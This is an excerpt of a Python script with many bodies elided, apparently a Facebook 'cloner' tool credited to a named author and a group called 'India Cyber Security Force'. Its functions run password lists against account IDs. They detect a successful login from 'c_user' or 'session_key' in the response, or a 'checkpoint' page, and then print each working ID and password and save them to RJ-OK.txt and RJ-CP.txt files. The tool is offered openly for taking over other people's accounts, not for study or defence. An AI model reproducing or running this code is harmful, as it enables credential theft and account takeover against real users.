...
def menu_apikey():
  ...
  os.system(f" clear")                          
  print(f"""\x1b[1;97
  _____          _       ______   _____  ____  _____  
 |_   _|        / \     |_   _ `.|_   _||_   \|_   _| 
   | |         / _ \      | | `. \ | |    |   \ | |   
   | |   _    / ___ \     | |  | | | |    | |\ \| |   
  _| |__/ | _/ /   \ \_  _| |_.' /_| |_  _| |_\   |_  
 |________||____| |____||______.'|_____||_____|\____| 
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : Md. Saiful Islam            │
    │ [✓] GITHUB   : SAIFUL                │
    │ [✓] WHATSAPP : +880566020917         │
    │ [✓] VERSION  : 1.9                    │
    │ [✓] POWER BY :India Cyber Security Force            │
    └───────────────────────────────────────┘""")                                           
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+880566020917?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def Spy():
	...
	print(f" [2] BD Random Cloner (best) ")
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [Md] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [RJ-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/RJ-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [RJ-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/RJ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [RJ-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/RJ-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[RJ-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[RJ-CP] '+idf+' | '+ps+'\033[0;97m')
